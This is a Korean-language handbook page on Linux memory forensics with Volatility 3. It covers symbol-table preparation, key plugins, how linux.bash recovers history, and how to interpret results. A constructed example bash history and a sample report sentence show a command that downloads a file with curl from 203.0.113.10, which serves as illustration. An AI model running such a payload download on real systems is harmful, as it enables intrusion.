---
title: "메모리 분석"
parent: "기법 · 분석"
nav_order: 990
---

# 메모리 분석 (Volatility 3)

떠낸 Linux 메모리 이미지를 Volatility 3 로 읽어 프로세스·연결·열린 파일·셸 명령 같은 휘발성 정보를 되살리는 절차입니다. 이미지의 커널과 정확히 맞는 심볼 표를 먼저 구해야 하고, 여러 방식으로 뽑은 목록을 서로 맞대어 보는 것이 분석의 뼈대입니다.

## 언제 쓰나

[메모리 수집](../acquisition/memory-acquisition.md) 으로 LiME·AVML 이미지를 떠냈다면 이 절차로 읽습니다. 디스크에 남지 않는 정보가 필요할 때 씁니다. 실행 중이던 프로세스와 그 명령줄, 열려 있던 네트워크 연결, 셸 기록 파일에 아직 쓰지 않은 명령, 파일 없이 메모리에만 올라온 코드가 그런 예입니다. 살아 있는 시스템에서 `/proc` 를 직접 읽는 방법은 [실행 중인 프로세스 (/proc)](../../02-artifacts/execution/proc.md) 에서 다룹니다. 메모리 이미지는 그 결과를 나중에 다시 검증할 수 있고, 루트킷이 `/proc` 출력을 속이는 경우에도 커널 구조를 직접 읽는다는 점이 다릅니다.

Volatility 3 는 메모리를 수집하지 않으므로 수집은 AVML 같은 다른 도구로 합니다[2].

## 절차

1. **이미지 확인과 해시 기록.** 이미지 형식(LiME 헤더 등)과 해시를 확인하고 분석 사본에서만 작업합니다. 헤더 구조는 [메모리 수집](../acquisition/memory-acquisition.md) 에 있습니다.
2. **커널 배너 확인.** `python3 vol.py -f 이미지 banners` 로 이미지 안의 커널 배너 문자열을 찾습니다[1][2]. 배너는 `Linux version` 으로 시작하고 커널 판, 빌드 호스트, gcc 판, 빌드 시각을 담습니다[2]. 한 이미지에서 배너가 여러 개 나올 수 있습니다[2]. 수집 때 기록한 `uname -r` 결과와 맞춰 봅니다.
3. **심볼 표 준비.** 배너와 정확히 같은 심볼 표를 구합니다. 방법은 아래 "심볼 표 준비" 에 있습니다. `isfinfo` 플러그인은 Volatility 3 가 아는 심볼 표 목록과 각 표가 찾는 배너를 보여 줍니다[1].
4. **시각 기준 잡기.** `linux.boottime` 으로 부팅 시각을 봅니다[2][9]. 프로세스 생성 시각은 이 값을 바탕으로 계산하고[10], 커널 로그 시각은 부팅 뒤 흐른 초라서[13] 이 값에 더해야 벽시계 시각이 되므로 먼저 적어 둡니다.
5. **프로세스 목록과 트리.** `linux.pslist`, `linux.pstree`, `linux.psaux` 로 프로세스와 부모 관계, 명령줄을 봅니다[5][6].
6. **목록 맞대기.** `linux.pslist`(작업 목록을 따라감), `linux.pidhashtable`(PID 해시 표로 열거), `linux.psscan`(메모리 전체를 검색) 결과를 PID 기준으로 비교합니다[5][6][7][8]. 한쪽에만 있는 프로세스가 숨긴 프로세스 후보입니다. 해석 방법은 아래 "결과를 어떻게 해석하나" 와 [루트킷 찾기](rootkit-detection.md) 에 있습니다.
7. **프로세스별 세부 정보.** 네트워크 연결(`linux.sockstat`), 열린 파일(`linux.lsof`), 메모리 맵(`linux.proc`), 메모리에 매핑된 ELF(`linux.elfs`), 적재한 라이브러리(`linux.library_list`), 환경 변수(`linux.envars`), 셸 기록(`linux.bash`)을 봅니다[5].
8. **의심 영역과 위장 확인.** `linux.malware.malfind` 로 코드 주입 후보 영역을, `linux.malware.process_spoofing` 으로 이름을 속인 프로세스를 찾습니다[14][15]. YARA 규칙으로 프로세스 메모리를 검사할 때는 `linux.vmayarascan` 을 씁니다[16]. 커널 모듈·시스템 콜 표·후킹 검사는 [루트킷 찾기](rootkit-detection.md) 에서 다룹니다.
9. **꺼내기.** 의심 영역은 `linux.malware.malfind --dump-regions` 로[14], 커널 주소에 있는 모듈은 `linux.module_extract` 로 ELF 파일로 다시 만듭니다[5]. 페이지 캐시에 남은 파일은 `linux.pagecache.Files` 로 목록을 보고 `linux.pagecache.InodePages` 로 꺼내며, `linux.pagecache.RecoverFs` 는 캐시에 남은 파일 시스템을 압축 묶음으로 되살립니다[17]. 꺼낸 파일의 해시 대조는 [알려진 파일 대조와 YARA](hash-yara.md) 로 이어집니다.
10. **다른 기록과 교차 확인.** 메모리에서 찾은 프로세스·연결·명령을 디스크의 로그와 [셸 명령 기록](../../02-artifacts/execution/shell-history/index.md), [타임라인](timeline.md) 에 맞춰 봅니다.

## 도구

### 심볼 표 준비

Volatility 3 는 Linux 커널 구조체의 배치를 JSON 형식의 심볼 표(ISF, Intermediate Symbol File)에서 읽습니다[1][4]. 심볼 표는 `.json`, `.json.gz`, `.json.xz` 파일이나 이것을 묶은 ZIP 으로 두고, 기본 위치는 `volatility3/symbols` 디렉터리입니다[1]. Linux 표는 그 아래 `linux` 디렉터리에 둡니다[1]. 파일 이름은 상관없고, Volatility 3 가 표 안의 배너 문자열로 알아보며 배너와 파일의 대응을 캐시에 적어 둡니다[1]. 쓴 표의 내용은 `~/.cache/volatility3`(`XDG_CACHE_HOME` 을 정하면 `${XDG_CACHE_HOME}/volatility3`)에 압축해 캐시합니다[1]. 새 표를 많이 넣으면 첫 실행 때 캐시를 갱신하느라 오래 걸립니다[1][3].

Linux 심볼 표는 표 안의 배너가 이미지의 배너와 **정확히** 같아야 쓰입니다[1]. 커널은 설정에 따라 구조체 배치가 달라지기 때문에 판 번호만 같아서는 안 되고 빌드 시각과 gcc 판까지 맞아야 합니다[1]. 틀린 표를 억지로 맞추는 방법은 일부러 두지 않았습니다[1]. Volatility 3 가 내려받게 해 둔 심볼 표 묶음에 `linux.zip` 도 있지만, Linux 커널은 쉽게 빌드할 수 있고 서로 구별할 수 없어서 모든 커널을 담은 모음은 내놓기 어렵습니다[3].

표를 만드는 공식 방법은 이렇습니다[1][4].

1. `banners` 로 배너를 확인하고, 그 배너와 같은 디버그 정보 포함 커널을 구합니다. 대부분 배포판은 기본 커널에서 디버그 정보를 빼고 배포하므로 디버그 패키지를 따로 받아야 하고, 패키지 이름은 배포판마다 다릅니다[1].
2. `dwarf2json linux --elf 디버그커널경로 > 이름.json` 으로 변환합니다[1][4]. 옵션은 `--elf`(심볼과 타입), `--elf-symbols`(심볼만), `--elf-types`(타입만), `--system-map`(System.map 의 심볼)입니다[4]. 심볼 주소가 서로 다르면 System.map 이 가장 앞서고, 그다음이 ELF 심볼 표, 마지막이 DWARF 입니다[4]. 빠짐없이 담으려면 System.map 을 함께 넣는 편이 좋지만, 디버그 정보가 든 커널은 DWARF 안에 같은 심볼 오프셋이 들어 있는 경우가 많습니다[1]. 큰 DWARF 파일을 처리하려면 RAM 이 8GB 이상 필요합니다[4].
3. 만든 파일을 `symbols/linux` 아래에 둡니다[1].

배포판이 옛 디버그 패키지를 다 보관하지는 않아서 맞는 심볼을 끝내 못 구하면 그 이미지는 Volatility 3 로 분석할 수 없습니다[1]. 직접 만들기 전에 Debian·Ubuntu·AlmaLinux 커널용으로 미리 만든 표(`.json.xz`)를 커널 판별로 모은 커뮤니티 저장소(`Abyss-W4tcher/volatility3-symbols`)부터 찾아봅니다[2]. 제3자가 만든 표이므로 배너가 정확히 같은지 `isfinfo` 로 확인하고 출처를 분석 기록에 적습니다.

심볼을 구하는 방법은 자료마다 다릅니다. 공식 문서는 디버그 커널과 dwarf2json 을 씁니다[1]. Rekall 은 대상의 `/proc/kallsyms` 로 미리 만든 프로필 색인에서 맞는 프로필을 자동으로 골랐습니다[21]. 커널 구조체 배치는 커널 판과 커널 설정 두 가지에 따라 달라지고, 조사 대상 시스템에 컴파일러와 커널 헤더를 설치해 프로필을 만들면 대상을 바꾸게 되므로 피합니다[21]. LEMON 논문은 커널에 들어 있는 BTF(BPF Type Format) 정보로 Volatility 3 프로필을 만드는 도구 `btf2json` 을 Android 커널에 맞게 고쳐 썼습니다[22].

### 주요 플러그인

실행 형식은 `python3 vol.py -f 이미지경로 플러그인이름 옵션` 이고, Linux 전용 플러그인은 40개가 넘습니다[2]. 전체 목록은 `python3 vol.py --help` 출력에서 `linux.` 로 시작하는 이름을 보면 됩니다[2]. 조사에 자주 쓰는 것은 아래와 같습니다[5].

| 목적 | 플러그인 | 내용 |
|---|---|---|
| 프로세스 | `linux.pslist`, `linux.pstree`, `linux.psaux` | 작업 목록, 부모-자식 트리, 명령줄 |
| 숨은 프로세스 | `linux.psscan`, `linux.pidhashtable` | 메모리 검색, PID 해시 표 열거 |
| 셸 | `linux.bash` | bash 명령 기록 복구 |
| 파일·매핑 | `linux.lsof`, `linux.proc`, `linux.elfs`, `linux.library_list` | 열린 파일, 메모리 맵, 매핑된 ELF, 적재한 라이브러리 |
| 네트워크 | `linux.sockstat`, `linux.sockscan`, `linux.ip.Addr`, `linux.ip.Link` | 프로세스별 소켓, 메모리 검색 소켓, 인터페이스 주소와 상태 |
| 시스템 | `linux.boottime`, `linux.kmsg`, `linux.mountinfo`, `linux.vmcoreinfo`, `linux.iomem` | 부팅 시각, 커널 로그 버퍼, 마운트, VMCOREINFO, 물리 메모리 배치 |
| 권한·추적 | `linux.capabilities`, `linux.ptrace`, `linux.envars` | 프로세스 권한, ptrace 추적 관계, 환경 변수 |
| 커널 | `linux.lsmod`, `linux.kallsyms`, `linux.kthreads`, `linux.ebpf`, `linux.module_extract` | 모듈, 커널 심볼, 커널 스레드, eBPF 프로그램, 모듈 ELF 재구성 |
| 의심 코드 | `linux.malware.malfind`, `linux.malware.process_spoofing`, `linux.vmayarascan`, `linux.vmaregexscan` | 주입 후보 영역, 이름 위장, YARA·정규식 검사 |
| 파일 캐시 | `linux.pagecache.Files`, `linux.pagecache.InodePages`, `linux.pagecache.RecoverFs` | 페이지 캐시의 파일 목록과 복구 |

`linux.pslist` 는 OFFSET (V), PID, TID, PPID, COMM, UID, GID, EUID, EGID, CREATION TIME 칸을 내고, `--threads` 를 주면 사용자 스레드까지 보여 주고, `--dump` 를 주면 목록의 프로세스를 파일로 꺼냅니다[6]. `linux.psscan` 은 OFFSET (P), PID, TID, PPID, COMM, EXIT_STATE 칸을 냅니다[7]. `linux.lsof` 는 파일마다 Changed·Modified·Accessed 시각과 크기를 함께 냅니다[5].

예전 이름 `linux.malfind`, `linux.check_syscall`, `linux.hidden_modules` 같은 탐지용 플러그인은 `linux.malware.` 아래로 옮겨졌고, 옛 이름에는 폐기 예정 표시와 `removal_date="2026-06-07"` 이 붙어 있습니다[18]. 옛 글과 튜토리얼에는 옛 이름이 그대로 남아 있으므로[2], 판에 따라 새 이름으로 바꿔 부릅니다.

`linux.bash`, `linux.pslist`, `linux.psscan`, `linux.malware.malfind`, `linux.vmayarascan`, `linux.malware.process_spoofing` 은 Intel 32비트·64비트 이미지만 받습니다[6][7][11][14][15][16]. ARM 이미지는 쓸 수 있는 플러그인이 더 적습니다.

### linux.bash 가 찾는 바이트

bash 는 명령 기록 한 줄마다 `hist_entry` 구조를 두고, 여기에 명령 문자열 포인터와 시각 문자열 포인터를 담습니다[11][12]. 시각 문자열은 `#` 뒤에 Unix 초를 10진 숫자로 적은 모양입니다[12][19]. `linux.bash` 는 이 점을 이용해 bash 프로세스의 힙에서 `#` 바이트를 모두 찾고, 그 주소를 가리키는 포인터를 다시 찾은 뒤, 포인터 자리를 `hist_entry` 의 timestamp 칸으로 보고 구조를 짜 맞춥니다[11]. 시각 문자열이 `#` 로 시작하고 10자 이상이며 `#` 뒤가 모두 숫자이고 명령 문자열이 비어 있지 않을 때만 항목으로 받아들이고, 시각순으로 정렬해 냅니다[11][12].

아래는 이 규칙으로 만든 예시이고 실제 검체 값이 아닙니다. 힙에 시각 문자열 `#1700000000` 이 이렇게 들어 있다고 합니다.

```text
00000000  23 31 37 30 30 30 30 30  30 30 30 00              |#1700000000.|
```

1. 첫 바이트 `23` 이 `#` 입니다.
2. 뒤의 `31 37 30 ...` 은 숫자 `1700000000` 을 ASCII 로 적은 것이고, `00` 으로 끝납니다.
3. 이 문자열의 주소를 담은 8바이트 포인터(64비트)가 힙 어딘가에 있으면, 그 자리가 `hist_entry` 의 timestamp 칸입니다. 같은 구조의 명령 문자열 포인터를 따라가면 명령이 나옵니다.
4. `1700000000` 을 Unix 초로 읽으면 2023-11-14 22:13:20 UTC 입니다.

출력은 PID, Process, CommandTime, Command 네 칸입니다[11]. 아래는 만든 예시입니다.

```text
PID     Process CommandTime                     Command
2481    bash    2026-03-14 01:52:10.000000 UTC  cd /tmp
2481    bash    2026-03-14 01:52:31.000000 UTC  curl -o upd http://203.0.113.10/upd
```

zsh 는 시각을 `#` 붙은 문자열이 아니라 4바이트 정수로 담아서 이 방식으로는 찾을 수 없습니다[19]. glibc 힙 청크를 분석해 zsh 명령을 찾는 Rekall 플러그인이 있고, 이 구현은 glibc 2.20~2.24 와 x86·x64 를 지원합니다[19]. Volatility 3 에는 zsh 용 플러그인이 없으므로 zsh 사용자는 힙을 꺼내 문자열을 직접 찾는 수밖에 없습니다.

### 데스크톱 도청 흔적 (연구 플러그인)

Volatility 3 2.11 용 연구 플러그인 `xevents`, `xinputextensions`, `xclients`(X11 키 입력·화면 캡처), `v4l2`(카메라), `pipewire`(마이크)가 발표됐습니다[20]. Ubuntu 24.04, Xubuntu·Kubuntu 24.04, Linux Mint 22.1, Fedora 41, Debian 12.9, CentOS 10, Rocky 9.5 가상 머신에서 AVML 로 뜬 덤프로 시험한 결과, 실행한 도청 공격을 이 플러그인들이 모두 찾아냈습니다[20]. 같은 시험에서 Wayland 를 쓰는 배포판이라도 Wayland 를 직접 지원하지 않는 Chromium·Electron 앱은 키 입력 기록과 화면 캡처에 노출됐습니다[20]. 이 플러그인들은 Volatility 3 본체에 들어 있지 않습니다.

## 함정과 한계

**배너가 조금만 달라도 분석이 안 됩니다.** 판 번호가 같아도 빌드 시각이 다르면 다른 커널입니다[1]. 비슷한 표로 억지로 돌린 결과는 증거로 쓰지 않습니다. 맞는 표를 못 구하면 그 사실과 확인한 배너를 기록에 남깁니다.

**`linux.bash` 는 프로세스 이름으로 고릅니다.** COMM 이 `bash`, `sh`, `dash` 인 프로세스만 검사합니다[11]. bash 를 다른 이름으로 복사해 실행했거나 COMM 을 바꾼 셸은 빠지므로, 의심 프로세스가 있으면 `--pid` 로 따로 보거나 힙을 꺼내 직접 찾습니다. 포인터 검색으로 구조를 짜 맞추는 방식이라 명령 칸에 깨진 바이트가 나오는 거짓 항목이 섞일 수 있습니다[2].

**bash 기록 시각이 명령을 친 시각이라고 단정할 수 없습니다.** 명령 여러 개가 같은 초로 찍혀 나오는 경우가 있습니다[2]. 기록 파일에서 한꺼번에 읽어 들인 항목일 가능성이 있으므로, 같은 초에 몰린 항목은 [셸 명령 기록](../../02-artifacts/execution/shell-history/index.md) 파일과 맞춰 봅니다.

**malfind 는 권한만 봅니다.** `linux.malware.malfind` 는 VMA 가 `rwx` 이거나, 파일에 매핑되지 않은 `r-x` 이거나, 실행 권한이 있는 영역 안에 쓰인(dirty) 페이지가 있으면 의심으로 표시합니다[14]. 판정이 권한·매핑 여부·쓰인 페이지만으로 이뤄지므로 JIT 컴파일러처럼 실행 코드를 정상적으로 메모리에 만드는 프로그램도 걸립니다[2]. 걸린 영역은 프로세스가 무엇인지, 내용이 무엇인지 확인한 뒤에 판단합니다.

**목록 차이가 모두 숨김은 아닙니다.** `linux.psscan` 은 스케줄러 클래스(`*_sched_class`) 주소를 메모리에서 검색해 task 구조를 찾으므로 이미 끝난 프로세스의 흔적도 나올 수 있습니다[7]. EXIT_STATE 가 `EXIT_ZOMBIE`, `EXIT_DEAD` 로 나오는 항목은 끝난 프로세스이지 숨긴 프로세스가 아닙니다[7].

**없는 페이지는 0 으로 읽힙니다.** 스왑으로 나간 페이지나 수집에서 빠진 범위는 이미지에 없습니다. `linux.vmayarascan` 은 이런 자리를 0 으로 채워 읽으므로 규칙에 걸리지 않았다고 그 내용이 없었다는 뜻은 아닙니다[16]. 1GB 보다 큰 VMA 는 아예 검사하지 않습니다[16]. 스왑 파일에 남은 페이지는 [스왑과 최대 절전](../../01-foundations/disk-volume/swap-hibernation.md) 에서 따로 찾습니다.

**수집 중에 메모리가 바뀝니다.** 라이브 수집 이미지는 한순간의 스냅숏이 아니고, 수집하는 동안 바뀐 부분이 섞입니다[22]. 서로 다른 구조가 가리키는 값이 어긋나거나 목록 중간이 끊기면 수집 중 변화일 가능성도 따집니다. 수집 쪽 수치는 [메모리 수집](../acquisition/memory-acquisition.md) 에 있습니다.

**컨테이너는 시간 이름공간이 다를 수 있습니다.** 커널 5.6 부터 시간 이름공간이 있고, `linux.boottime` 은 이름공간마다 부팅 시각을 따로 냅니다[9][10]. `linux.pslist` 의 생성 시각은 호스트(루트 이름공간) 기준입니다[10].

**플러그인 이름과 동작은 판마다 바뀝니다.** 옛 이름의 폐기 예정 표시가 그 예입니다[18]. 결과를 보고서에 쓸 때는 Volatility 3 판과 심볼 표 파일 이름을 함께 적습니다.

## 결과를 어떻게 해석하나

**증명하는 것.** 수집하는 동안 커널 구조에 그 프로세스·소켓·열린 파일·모듈이 있었다는 것입니다. `linux.pslist` 와 `linux.pidhashtable` 둘 다에 있는 프로세스는 수집 당시 커널이 관리하던 프로세스입니다. `linux.bash` 로 되살린 명령은 그 bash 프로세스의 기록 목록에 들어 있던 명령입니다.

**증명하지 못하는 것.** 이미지에 없다고 그 시각에 없었다는 뜻은 아닙니다. 끝난 프로세스는 목록에서 빠지고, 스왑으로 나간 페이지와 수집에서 빠진 범위는 읽을 수 없습니다[16]. bash 기록에 명령이 있다는 것은 그 명령을 셸에 입력했다는 뜻이지 성공했다는 뜻이 아닙니다. malfind 에 걸린 영역은 주입 코드 후보일 뿐 악성이라는 판정이 아닙니다[14].

**목록을 맞댄 결과 읽기.** PID 해시 표와 메모리 검색에는 있는데 작업 목록에 없는 실행 중 프로세스는 작업 목록에서 빼낸(unlink) 흔적일 가능성이 있습니다. 메모리 검색에만 있고 EXIT_STATE 가 종료 상태이면 끝난 프로세스입니다[7]. `linux.malware.process_spoofing` 은 실행 파일 경로(`mm.exe_file`)의 파일 이름을 명령줄 첫 인자와 COMM 에 비교합니다[15]. COMM 은 15자에서 잘리므로 실행 파일 이름 앞 15자와 비교하고, 비교할 이름이 두 개가 안 되는 프로세스(커널 스레드 등)는 건너뜁니다[15]. 실행 파일 경로 끝에 ` (deleted)` 가 붙은 프로세스는 Exe_Deleted 칸이 참이 됩니다[15]. 실행 파일이 실행 뒤 디스크에서 지워졌다는 뜻이므로 [지운 파일 되살리기](file-recovery.md) 와 `linux.pslist --dump` 로 이어 갑니다.

**시각.** Volatility 3 가 내는 시각은 UTC 입니다. 부팅 시각은 커널의 시간 관리 구조(`tk_core.timekeeper`)에서 벽시계 기준 오프셋(`offs_real`)과 부팅 기준 오프셋(`offs_boot`)의 차이로 계산합니다(커널 4.10 이상)[10]. 수집 순간의 벽시계 오프셋으로 거꾸로 계산한 값이므로, 부팅 뒤에 시스템 시계를 크게 바꿨다면 실제 부팅 시각과 다를 가능성이 있습니다. [부팅과 종료 기록](../../02-artifacts/system-info/boot-shutdown.md) 의 기록과 맞춰 봅니다. 프로세스 생성 시각은 부팅 시각(초 단위로 자름)에 task 의 부팅 후 시작 시각(`start_boottime` 등)을 더한 값이라, `ps` 가 보여 주는 시작 시각과 같은 방식입니다[10]. `linux.kmsg` 의 timestamp 칸은 부팅 뒤 흐른 초를 `dmesg` 와 같은 소수 여섯 자리 모양으로 적은 것입니다[13]. 이 값의 뜻은 [커널 로그](../../02-artifacts/system-info/kernel-log.md) 에서 다룹니다. bash 기록 시각은 `hist_entry` 에 문자열로 적힌 Unix 초이고 UTC 로 표시됩니다[12]. 이 값은 대상 시스템의 시계를 따르므로 시계가 틀렸다면 그대로 틀립니다. 시각 값 형식은 [Linux 의 시각 값](../../01-foundations/value-decoding/time-values.md) 에 있습니다.

**보고서 문장 예.** "메모리 이미지(수집 2026-03-14 02:10Z)에서 PID 2481 인 bash 프로세스의 명령 기록에 `curl -o upd http://203.0.113.10/upd` 가 있고, 기록 시각은 2026-03-14 01:52:31 UTC 이다. 같은 이미지의 `linux.sockstat` 결과에는 203.0.113.10 과의 TCP 연결이 없다." (값은 모두 만든 예시)

다른 운영체제의 메모리 분석은 [Windows 메모리 분석](https://urock-ailab.github.io/forensics-handbook/windows/03-techniques/analysis/memory-forensics/index.html), [macOS 메모리 분석](https://urock-ailab.github.io/forensics-handbook/mac/03-techniques/analysis/memory-forensics/index.html), [메모리에서 AI 흔적 찾기](https://urock-ailab.github.io/forensics-handbook/ai/03-techniques/analysis/memory-analysis.html) 에서 다룹니다.

## 참고 문헌

1. Volatility Foundation, doc/source/symbol-tables.rst. https://github.com/volatilityfoundation/volatility3/blob/develop/doc/source/symbol-tables.rst
2. Volatility Foundation, doc/source/getting-started-linux-tutorial.rst. https://github.com/volatilityfoundation/volatility3/blob/develop/doc/source/getting-started-linux-tutorial.rst
3. Volatility Foundation, volatility3 README.md. https://github.com/volatilityfoundation/volatility3/blob/develop/README.md
4. Volatility Foundation, dwarf2json README.md. https://github.com/volatilityfoundation/dwarf2json/blob/master/README.md
5. Volatility Foundation, volatility3/framework/plugins/linux (플러그인 디렉터리). https://github.com/volatilityfoundation/volatility3/tree/develop/volatility3/framework/plugins/linux
6. Volatility Foundation, volatility3/framework/plugins/linux/pslist.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/pslist.py
7. Volatility Foundation, volatility3/framework/plugins/linux/psscan.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/psscan.py
8. Volatility Foundation, volatility3/framework/plugins/linux/pidhashtable.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/pidhashtable.py
9. Volatility Foundation, volatility3/framework/plugins/linux/boottime.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/boottime.py
10. Volatility Foundation, volatility3/framework/symbols/linux/extensions/\_\_init\_\_.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/symbols/linux/extensions/__init__.py
11. Volatility Foundation, volatility3/framework/plugins/linux/bash.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/bash.py
12. Volatility Foundation, volatility3/framework/symbols/linux/extensions/bash.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/symbols/linux/extensions/bash.py
13. Volatility Foundation, volatility3/framework/plugins/linux/kmsg.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/kmsg.py
14. Volatility Foundation, volatility3/framework/plugins/linux/malware/malfind.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/malware/malfind.py
15. Volatility Foundation, volatility3/framework/plugins/linux/malware/process_spoofing.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/malware/process_spoofing.py
16. Volatility Foundation, volatility3/framework/plugins/linux/vmayarascan.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/vmayarascan.py
17. Volatility Foundation, volatility3/framework/plugins/linux/pagecache.py. https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/pagecache.py
18. Volatility Foundation, volatility3/framework/plugins/linux/malfind.py (폐기 예정 표시). https://github.com/volatilityfoundation/volatility3/blob/develop/volatility3/framework/plugins/linux/malfind.py
19. Frank Block, Andreas Dewald, "Linux memory forensics: Dissecting the user space process heap", Digital Investigation 22 (2017) S66–S75, DFRWS 2017 USA. https://doi.org/10.1016/j.diin.2017.06.002
20. Lukas Schmidt, Sebastian Strasda, Sebastian Schinzel, "Uncovering linux desktop espionage", Forensic Science International: Digital Investigation 53 (2025) 301921, DFRWS USA 2025. https://doi.org/10.1016/j.fsidi.2025.301921
21. Arkadiusz Socała, Michael Cohen, "Automatic Profile generation for live Linux Memory analysis", DFRWS EU 2016 발표 자료. https://dfrws.org/presentation/automatic-profile-generation-for-live-linux-memory-analysis/
22. Andrea Oliveri, Marco Cavenati, Stefano De Rosa, Sudharsun Lakshmi Narasimhan, Davide Balzarotti, "LEMON: A universal eBPF-based volatile memory acquisition tool for modern android devices and hardened linux systems", Forensic Science International: Digital Investigation 56 (2026) 302045, DFRWS EU 2026. https://doi.org/10.1016/j.fsidi.2026.302045
